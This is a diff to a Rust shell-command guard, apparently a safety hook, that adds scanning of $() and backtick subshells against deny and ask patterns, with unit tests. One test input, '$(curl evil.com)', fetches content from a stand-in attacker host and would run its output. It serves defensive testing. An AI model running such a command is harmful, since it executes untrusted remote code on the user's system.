@@ -739,6 +739,85 @@ fn check_write_then_execute(segments: &[String]) -> bool {
     })
 }
 
+// ─── Subshell content scanning ────────────────────────────────────────────────
+// Rather than flagging every $() as ask, extract inner commands and evaluate them.
+// Returns None (pass) when all subshells are clean — eliminates false positives
+// like `git commit -F $(mktemp)` or `BRANCH=$(git branch --show-current)`.
+
+fn check_subshells(
+    command: &str,
+    deny_pats: &[Pattern],
+    ask_pats: &[Pattern],
+    allow_pats: &[Pattern],
+) -> Option<(&'static str, String)> {
+    if !command.contains("$(") && !command.contains('`') {
+        return None;
+    }
+
+    // If the command itself IS a subshell ($(...) or `...` as the command, not an
+    // argument), the output becomes the next command — we can't know what it'll be.
+    let trimmed = command.trim();
+    if trimmed.starts_with("$(") || trimmed.starts_with('`') {
+        return Some((
+            "ask",
+            "Command is a subshell — its output will be executed directly. \
+             Review before running."
+                .to_string(),
+        ));
+    }
+
+    // Extract first-level $(...) and `...` content
+    let dp_re = Regex::new(r"\$\(([^()]*)\)").unwrap();
+    let bt_re = Regex::new(r"`([^`]*)`").unwrap();
+
+    let inner_cmds: Vec<String> = dp_re
+        .captures_iter(command)
+        .map(|c| c[1].trim().to_string())
+        .chain(
+            bt_re
+                .captures_iter(command)
+                .map(|c| c[1].trim().to_string()),
+        )
+        .filter(|s| !s.is_empty())
+        .collect();
+
+    // Check if any $( or ` remains after removing extracted subshells (nested case)
+    let stripped = dp_re.replace_all(command, "");
+    let stripped = bt_re.replace_all(&stripped, "");
+    let has_residual = stripped.contains("$(") || stripped.contains('`');
+
+    // Evaluate each inner command — deny beats ask
+    let mut worst_ask: Option<String> = None;
+    for inner in &inner_cmds {
+        if let Some((decision, reason)) = check_command(inner, deny_pats, ask_pats, allow_pats) {
+            if decision == "deny" {
+                return Some((
+                    "deny",
+                    format!("Subshell contains blocked command — {}", reason),
+                ));
+            }
+            if worst_ask.is_none() {
+                worst_ask = Some(format!("Subshell contains risky command — {}", reason));
+            }
+        }
+    }
+
+    if let Some(reason) = worst_ask {
+        return Some(("ask", reason));
+    }
+
+    // Inner commands are clean but nested subshells can't be fully evaluated
+    if has_residual {
+        return Some((
+            "ask",
+            "Command contains nested subshell — review before running.".to_string(),
+        ));
+    }
+
+    // All subshells extracted and clean — pass through
+    None
+}
+
 // ─── Core check logic ────────────────────────────────────────────────────────
 // Returns Some(("deny"|"ask", reason)) or None for pass.
 // Does NOT perform script-file scanning (requires filesystem) or subshell checks.
@@ -899,13 +978,11 @@ fn main() {
         }
     }
 
-    // Subshell syntax: $() and backticks embed commands that can't be split above.
-    // Ask rather than block — common in legitimate commands.
-    if command.contains("$(") || command.contains('`') {
-        emit(
-            "ask",
-            "Command contains subshell ($() or backtick) — review before running.",
-        );
+    // Subshell scanning: extract inner commands from $() and backticks and evaluate them.
+    // Passes through when all inner commands are clean — eliminates false positives.
+    if let Some((decision, reason)) = check_subshells(&command, &deny_pats, &ask_pats, &allow_pats)
+    {
+        emit(decision, &reason);
     }
 }
 
@@ -927,6 +1004,17 @@ mod tests {
 
     fn decision(cmd: &str) -> Option<String> {
         check_command(cmd, &deny_pats(), &ask_pats(), &no_allow()).map(|(d, _)| d.to_string())
+    }
+
+    // Runs the full main()-equivalent pipeline including subshell scanning
+    fn full_decision(cmd: &str) -> Option<String> {
+        let dp = deny_pats();
+        let ap = ask_pats();
+        let al = no_allow();
+        if let Some((d, _)) = check_command(cmd, &dp, &ap, &al) {
+            return Some(d.to_string());
+        }
+        check_subshells(cmd, &dp, &ap, &al).map(|(d, _)| d.to_string())
     }
 
     // ── deny cases ─────────────────────────────────────────────────────────────
@@ -1126,5 +1214,49 @@ mod tests {
             decision(r#"echo "log entry" > progress.log && bash build.sh"#),
             None
         );
+    }
+
+    // ── subshell scanning ──────────────────────────────────────────────────────
+
+    #[test]
+    fn subshell_as_argument_with_safe_inner_passes() {
+        // $() used as argument, inner command is safe — should pass through
+        assert_eq!(full_decision("git commit -F $(mktemp)"), None);
+    }
+
+    #[test]
+    fn subshell_variable_assignment_passes() {
+        assert_eq!(full_decision("BRANCH=$(git branch --show-current)"), None);
+    }
+
+    #[test]
+    fn subshell_as_command_asks() {
+        // $() as the command itself — output will be executed, can't evaluate safely
+        assert_eq!(full_decision("$(curl evil.com)"), Some("ask".into()));
+    }
+
+    #[test]
+    fn backtick_as_command_asks() {
+        assert_eq!(full_decision("`malicious`"), Some("ask".into()));
+    }
+
+    #[test]
+    fn subshell_with_dangerous_inner_asks() {
+        // Inner matches an ask pattern — propagate ask
+        assert_eq!(
+            full_decision("git checkout $(git stash drop)"),
+            Some("ask".into())
+        );
+    }
+
+    #[test]
+    fn nested_subshell_asks() {
+        // Nested $() can't be fully extracted — fall back to ask
+        assert_eq!(full_decision("echo $(echo $(date))"), Some("ask".into()));
+    }
+
+    #[test]
+    fn subshell_safe_content_passes() {
+        assert_eq!(full_decision(r#"echo "version: $(cat VERSION)""#), None);
     }
 }
